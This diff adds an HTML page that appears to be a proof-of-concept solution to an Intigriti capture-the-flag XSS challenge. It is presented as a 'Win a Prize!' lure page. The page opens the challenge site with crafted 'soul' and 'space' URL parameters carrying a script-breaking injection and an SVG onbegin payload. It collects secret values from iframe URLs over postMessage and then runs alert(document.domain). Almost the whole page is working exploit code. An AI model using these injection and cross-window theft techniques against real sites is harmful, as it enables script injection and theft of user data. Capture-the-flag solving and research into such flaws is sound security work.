@@ -1,0 +1,71 @@
+<!DOCTYPE html>
+<html>
+<head><title>Win a Prize!</title></head>
+<body>
+<h1>🎁 Click to claim your reward!</h1>
+<button id="go" style="padding:20px;font-size:20px;cursor:pointer;">🎉 Claim Reward</button>
+<pre id="log" style="margin-top:20px;padding:10px;background:#000;color:#0f0;font-family:monospace;"></pre>
+<script>
+const log = m => document.getElementById('log').textContent += m + '\n';
+
+let chunks = {};
+window.addEventListener('message', e => {
+    if (!e.data) return;
+    
+    // Collect individual chunks
+    if (e.data.p) { chunks.p = e.data.p; log('Power: ' + e.data.p); }
+    if (e.data.mi) { chunks.mi = e.data.mi; log('Mind: ' + e.data.mi); }
+    if (e.data.r) { chunks.r = e.data.r; log('Reality: ' + e.data.r); }
+    if (e.data.sp) { chunks.sp = e.data.sp; log('Space: ' + e.data.sp); }
+    if (e.data.s) { chunks.s = e.data.s; log('Soul: ' + e.data.s); }
+    if (e.data.t) { chunks.t = e.data.t; log('Time: ' + e.data.t); }
+    
+    // Check if we have all 6 chunks
+    if (chunks.p && chunks.mi && chunks.r && chunks.sp && chunks.s && chunks.t) {
+        const code = chunks.p + chunks.mi + chunks.r + chunks.sp + chunks.s + chunks.t;
+        log('Full code: ' + code);
+        
+        if (popup && !popup.closed) {
+            popup.postMessage(code + 'alert(document.domain)', '*');
+            log('>>> XSS TRIGGERED <<<');
+        }
+    }
+});
+
+let popup;
+document.getElementById('go').onclick = () => {
+    // Soul injection extracts chunks from parent iframes
+    const soulInject = '\";' +
+        'setTimeout(()=>{' +
+            'let p="",mi="",r="",t="";' +
+            'parent.document.querySelectorAll("iframe").forEach(f=>{' +
+                'let u=f.src,m;' +
+                'if(m=u.match(/power_stone=([^&]+)/))p=decodeURIComponent(m[1]);' +
+                'if(m=u.match(/mind_stone=([^&]+)/))mi=decodeURIComponent(m[1]);' +
+                'if(m=u.match(/reality_stone=([^&]+)/))r=decodeURIComponent(m[1]);' +
+                'if(m=u.match(/time_stone=([^&]+)/))t=decodeURIComponent(m[1]);' +
+            '});' +
+            'parent.opener.postMessage({p:p,mi:mi,r:r,s:soulStone,t:t},"*");' +
+        '},1000);//';
+    
+    // Space injection captures the postMessage chunk
+    const spaceInject = '<svg><animatetransform onbegin="' +
+        'parent.opener._sp=``;' +
+        'addEventListener(`message`,e=>{' +
+            'if(typeof e.data===`string` && e.data.length===8){' +
+                'parent.opener._sp=e.data;' +
+                'parent.opener.postMessage({sp:e.data},`*`)' +
+            '}' +
+        '})">';
+    
+    const url = 'https://challenge-1225.intigriti.io/challenge#PerfectlyBalanced' +
+        '?soul=' + encodeURIComponent(soulInject) +
+        '&space=' + encodeURIComponent(spaceInject);
+    
+    log('Opening...');
+    popup = window.open(url, '_blank', 'width=1000,height=800');
+};
+</script>
+</body>
+</html>
+
